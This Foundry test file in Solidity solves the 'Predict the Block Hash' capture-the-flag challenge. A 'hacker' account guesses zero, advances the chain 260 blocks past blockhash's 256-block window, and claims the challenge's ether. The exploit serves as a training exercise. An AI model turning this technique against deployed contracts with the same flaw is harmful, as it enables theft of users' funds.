// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {PredictTheBlockHashChallenge} from "src/Lotteries/PredictTheBlockHash.sol";

contract PredictTheBlockHashChallengeTest is Test {
    PredictTheBlockHashChallenge public predictTheBlockHashChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        payable(hacker).transfer(1 ether);

        predictTheBlockHashChallenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function testPredictTheBlockHash() public {
        console.log("my balance:", hacker.balance);
        console.log(
            "challenge balance:",
            address(predictTheBlockHashChallenge).balance
        );

        vm.startPrank(hacker);
        predictTheBlockHashChallenge.lockInGuess{value: 1 ether}(bytes32(0));

        vm.roll(block.number + 260);

        predictTheBlockHashChallenge.settle();
        vm.stopPrank();

        console.log("my new balance:", hacker.balance);
        console.log(
            "challenge new balance:",
            address(predictTheBlockHashChallenge).balance
        );

        assertTrue(predictTheBlockHashChallenge.isComplete());
    }
}